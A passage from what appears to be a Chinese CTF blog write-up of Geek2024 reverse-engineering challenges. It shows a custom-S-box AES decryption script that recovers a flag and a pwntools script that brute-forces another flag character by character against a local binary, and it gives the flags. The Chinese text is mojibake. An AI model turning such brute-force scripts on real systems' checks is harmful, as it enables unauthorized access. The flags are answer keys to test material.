       <span class="hljs-keyword">for</span> temp1, Rcon1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(temp, Rcon[(i // self.Nk) - <span class="hljs-number">1</span>]):<br>                    temp2.append(temp1 ^ Rcon1)<br>                temp = temp2<br>            <span class="hljs-keyword">elif</span> self.Nk &gt; <span class="hljs-number">6</span> <span class="hljs-keyword">and</span> i % self.Nk == <span class="hljs-number">4</span>:<br>                temp = self.SubWord(temp)<br>            w_temp = []<br>            <span class="hljs-keyword">for</span> w1, temp1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(w[i - self.Nk], temp):<br>                w_temp.append(w1 ^ temp1)<br>            w[i] = w_temp<br>            i = i + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> w<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">IAES</span>(<span class="hljs-params">self, IInput, Cipher_Key,inv_s_box</span>):<br>        IInput = [IInput1 <span class="hljs-keyword">for</span> IInput1 <span class="hljs-keyword">in</span> IInput]<br>        Cipher_Key = [Cipher_Key1 <span class="hljs-keyword">for</span> Cipher_Key1 <span class="hljs-keyword">in</span> Cipher_Key]<br>        KeyExpansion = self.KeyExpansion(Cipher_Key)<br>        keys = []<br>        <span class="hljs-keyword">for</span> Key_index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(KeyExpansion) // <span class="hljs-number">4</span>):<br>            keys_temp = (KeyExpansion[<span class="hljs-number">4</span> * Key_index] + KeyExpansion[<span class="hljs-number">4</span> * Key_index + <span class="hljs-number">1</span>] + KeyExpansion[<br>                <span class="hljs-number">4</span> * Key_index + <span class="hljs-number">2</span>] + KeyExpansion[<span class="hljs-number">4</span> * Key_index + <span class="hljs-number">3</span>])<br>            keys_temp = self.arrays(keys_temp)<br>            keys.append(keys_temp)<br>        IInput = self.arrays(IInput)<br>        self.view(IInput)<br>        self.view(keys[-<span class="hljs-number">1</span>])<br>        IInput = self.AddRoundKey(IInput, keys[-<span class="hljs-number">1</span>])<br>        self.view(IInput)<br>        <span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.Nr - <span class="hljs-number">1</span>):<br>            IInput = self.InvShiftRows(IInput)<br>            self.view(IInput)<br>            IInput = self.InvSubBytes(IInput,inv_s_box)<br>            self.view(IInput)<br>            self.view(keys[-<span class="hljs-number">1</span> - <span class="hljs-number">1</span> - index])<br>            IInput = self.AddRoundKey(IInput, keys[-<span class="hljs-number">1</span> - <span class="hljs-number">1</span> - index])<br>            self.view(IInput)<br>            IInput = self.InvMixColumns(IInput)<br>            self.view(IInput)<br>        IInput = self.InvShiftRows(IInput)<br>        self.view(IInput)<br>        IInput = self.InvSubBytes(IInput,inv_s_box)<br>        self.view(IInput)<br>        self.view(keys[<span class="hljs-number">0</span>])<br>        IInput = self.AddRoundKey(IInput, keys[<span class="hljs-number">0</span>])<br>        self.view(IInput)<br>        IInput = self.Inv_arrays(IInput)<br>        IInput = <span class="hljs-built_in">bytes</span>(IInput)<br>        <span class="hljs-keyword">return</span> IInput<br><br><br>S_box = [<br>    <span class="hljs-number">0x63</span>, <span class="hljs-number">0x7c</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x76</span>,<br>    <span class="hljs-number">0xca</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0xd4</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xc0</span>,<br>    <span class="hljs-number">0xb7</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x15</span>,<br>    <span class="hljs-number">0x04</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x75</span>,<br>    <span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x84</span>,<br>    <span class="hljs-number">0x53</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xfc</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xcb</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xcf</span>,<br>    <span class="hljs-number">0xd0</span>, <span class="hljs-number">0xef</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0xa8</span>,<br>    <span class="hljs-number">0x51</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xd2</span>,<br>    <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x73</span>,<br>    <span class="hljs-number">0x60</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0xdb</span>,<br>    <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x79</span>,<br>    <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0xea</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x08</span>,<br>    <span class="hljs-number">0xba</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x8a</span>,<br>    <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x9e</span>,<br>    <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xdf</span>,<br>    <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0x16</span><br>]<br><br>new_s_box = [<span class="hljs-number">0x7C</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>,<br>  <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xC9</span>,<br>  <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xA4</span>,<br>  <span class="hljs-number">0x72</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xCC</span>,<br>  <span class="hljs-number">0x34</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xC7</span>,<br>  <span class="hljs-number">0x23</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xE2</span>,<br>  <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x6E</span>,<br>  <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x84</span>,<br>  <span class="hljs-number">0x53</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xCB</span>,<br>  <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xFB</span>,<br>  <span class="hljs-number">0x43</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3C</span>,<br>  <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xF5</span>,<br>  <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xCD</span>,<br>  <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x3D</span>,<br>  <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2A</span>,<br>  <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xDB</span>,<br>  <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xD3</span>,<br>  <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x6D</span>,<br>  <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7A</span>,<br>  <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xC6</span>,<br>  <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3E</span>,<br>  <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xB9</span>,<br>  <span class="hljs-number">0x86</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xD9</span>,<br>  <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x8C</span>,<br>  <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x2D</span>,<br>  <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x87</span>]<br><br>new_contrary_sbox = [<span class="hljs-number">0</span>] * <span class="hljs-number">256</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    line = (new_s_box[i] &amp; <span class="hljs-number">0xf0</span>) &gt;&gt; <span class="hljs-number">4</span><br><br>    rol = new_s_box[i] &amp; <span class="hljs-number">0xf</span><br><br>    new_contrary_sbox[(line * <span class="hljs-number">16</span>) + rol] = i<br><br><br>IInput = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;99E8B801C882519312EE8964E7EF638D&#x27;</span>)<br>Cipher_Key = <span class="hljs-built_in">bytes</span>(<span class="hljs-string">b&#x27;SYCLOVERSYCLOVER&#x27;</span>)<br>Out = IAES().IAES(IInput, Cipher_Key,new_contrary_sbox)<br><span class="hljs-built_in">print</span>(Out)<br><span class="hljs-comment">#b&#x27;SYC&#123;B3l1eue_Th@t&#x27;</span><br>IInput = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;51DF5D7839AA3962A0B4503047302106&#x27;</span>)<br>Cipher_Key = <span class="hljs-built_in">bytes</span>(<span class="hljs-string">b&#x27;SYCLOVERSYCLOVER&#x27;</span>)<br>Out = IAES().IAES(IInput, Cipher_Key,new_contrary_sbox)<br><span class="hljs-built_in">print</span>(Out)<br><span class="hljs-comment">#b&#x27;_y0u__l3aRn_Aes&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="blasting-master"><a href="#blasting-master" class="headerlink" title="blasting_master"></a>blasting_master</h2><p>å››ä¸ªå­—æ¯ä¸€ç»„å»çˆ†ç ´ï¼Œä¸€æ¬¡å¾€åç§»ä¸€ä½ï¼Œæ€»å…±40æ¬¡å¾ªç¯</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731743209276-968d8e02-16af-447d-9ef1-ca6e8b07e0f6.png" class="" title="img"><p>EVPåŠ å¯†åç”Ÿæˆå¯†æ–‡ï¼Œæš‚ä¸”ä¸ç®¡</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731743238360-6c8125da-3c4d-476e-9bb9-60220dc7673e.png" class="" title="img"><p>æƒ³ç€æ˜¯patchç„¶åä¸€æ¬¡åŠ å¯†ä¸€æ¬¡åˆ¤æ–­ï¼Œä½†æ˜¯æ²¡æœ‰åˆé€‚çš„æŒ‡ä»¤å¯ä»¥ä¿®æ”¹ï¼Œäºæ˜¯æƒ³åˆ°ä¿®æ”¹ç‰¹å®šçš„æ¯”è¾ƒé•¿åº¦ï¼Œç„¶åä¸€ä½ä½çˆ†ç ´</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731755837095-34e01191-dfa3-4190-881f-6ace53636203.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> choice<br><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> ascii_letters, digits<br><br>filename=<span class="hljs-string">&#x27;./main&#x27;</span><br>elf = ELF(filename)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(io)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">addr</span>):<br>    <span class="hljs-comment">#bk=&quot;b *$rebase(&quot;+str(addr)+&quot;)&quot;</span><br>    bk=<span class="hljs-string">&#x27;b *&#x27;</span> + <span class="hljs-built_in">str</span>(addr)<br>    attach(io,bk)<br><br>s2=<span class="hljs-string">&#x27;SYC&#123;W0w!y0u_@re_th3_BeSt_blasting_Exp3rt!&#x27;</span><br>s1=<span class="hljs-string">&#x27;1234567890qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM!@#$^+=%&amp;*()_-&#123;&#125;~/.&#x27;</span><br>i=<span class="hljs-number">0</span><br>j=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br> <span class="hljs-keyword">try</span>:<br>    io=process(filename)<br>    s=s2<br>    s+=s1[j]<br>    sl(s.encode())<br>    recv0=io.recvline()<br>    recv1=io.recvline()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;Congratulations!&quot;</span> <span class="hljs-keyword">in</span> recv1:<br>    s2+=s1[j]<br>    <span class="hljs-built_in">print</span>(s2)<br>    i+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">break</span><br>    j+=<span class="hljs-number">1</span><br>    io.close()<br> <span class="hljs-keyword">except</span> EOFError:<br>    io.close()<br>    <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p>æŒ‰è¿™ä¸ªæ€è·¯èµ°ä¸åˆ°åº•ï¼Œçˆ†åˆ°3rè·‘ä¸ä¸‹å»äº†ï¼Œé‡åˆ°0å°±ä¼šæŠ¥é”™</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731756305965-f61088d9-fcc3-472e-a931-48c7ee06c4fb.png" class="" title="img"><p>ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯0ï¼Œèµ°ä¸‹å»å‘ç°åé¢çˆ†ä¸å‡ºæ¥äº†ï¼Œå°è¯•æŠŠ0åˆ å»</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731755819107-a4cb6054-cc04-4cc8-a9ef-11407cff77cf.png" class="" title="img"><p>å‘ç°åˆåœ¨tå¡ä½äº†ï¼Œå¾€ä¸‹èµ°èƒ½èµ°é€š</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731756394599-fa2e3a6e-7df4-4d2a-81aa-0793b879bc84.png" class="" title="img"><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 